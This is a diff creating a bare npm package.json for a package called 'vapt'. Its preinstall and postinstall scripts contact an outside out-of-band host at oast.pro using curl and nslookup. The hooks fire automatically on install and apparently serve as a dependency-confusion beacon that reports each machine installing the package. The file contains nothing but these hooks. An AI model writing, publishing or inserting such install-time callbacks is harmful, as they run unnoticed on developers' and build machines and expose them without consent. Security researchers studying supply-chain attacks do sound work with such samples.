@@ -1,0 +1,8 @@
+{
+  "name": "vapt",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -s http://npmpre.d9gg99uu5ratjla6atjgk4xntijony63s.oast.pro/ || nslookup npmpre.d9gg99uu5ratjla6atjgk4xntijony63s.oast.pro",
+    "postinstall": "nslookup npmpost.d9gg99uu5ratjla6atjgk4xntijony63s.oast.pro"
+  }
+}
